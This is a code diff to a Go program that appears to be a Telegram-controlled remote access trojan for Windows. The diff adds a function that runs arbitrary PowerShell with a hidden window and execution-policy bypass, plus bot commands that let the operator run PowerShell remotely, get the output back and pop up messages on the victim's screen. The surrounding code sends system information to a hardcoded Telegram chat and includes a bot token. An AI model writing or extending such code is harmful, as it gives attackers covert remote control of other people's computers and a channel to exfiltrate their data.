@@ -10,6 +10,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"syscall"
 	"time"
 
 	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
@@ -69,10 +70,29 @@ func readRegistryValue(root, path, name string) (string, error) {
 	return "", fmt.Errorf("value not found")
 }
 
+// ####################################################################################################
+func pwrcmd(code string) (string, error) {
+	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", code)
+
+	// Hide PowerShell window
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow: true,
+	}
+
+	out, err := cmd.CombinedOutput()
+	return string(out), err
+}
+
+// Function to pop up a message box with given text
+func saymsg(text string) {
+	ps := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("%s")`, text)
+	pwrcmd(ps)
+}
+
 //###################################################################################################333
 
 const (
-	BOT_TOKEN     = "7727386095:AAGVE3OsgVvAEEeZlFe6j5VK9ej4YMd9qm8"
+	BOT_TOKEN     = "7727386095:AAGch9a1EMA72xtZUW6TVdegJx_TuWbLEvk"
 	STARTUP_CHAT  = 5441972884
 	IMG_DIR       = "imgdat"
 	MAX_MSG_BYTES = 4096
@@ -300,6 +320,19 @@ func main() {
 
 		case strings.EqualFold(txt, "info"):
 			sendLargeMessage(bot, cid, getAllSystemInfo())
+		case strings.HasPrefix(strings.ToLower(txt), "msg "):
+			msgText := strings.TrimSpace(txt[4:])
+			go saymsg(msgText)
+			bot.Send(tgbotapi.NewMessage(cid, "[+] Msg shown"))
+
+		case strings.HasPrefix(strings.ToLower(txt), "pwcmd "):
+			pwcmdStr := strings.TrimSpace(txt[6:])
+			out, err := pwrcmd(pwcmdStr)
+			if err != nil {
+				sendLargeMessage(bot, cid, "[!] "+err.Error()+"\n"+string(out))
+			} else {
+				sendLargeMessage(bot, cid, string(out))
+			}
 		case strings.HasPrefix(strings.ToLower(txt), "cmd "):
 			cmdStr := strings.TrimSpace(txt[4:])
 			if strings.HasPrefix(strings.ToLower(cmdStr), "cd ") {
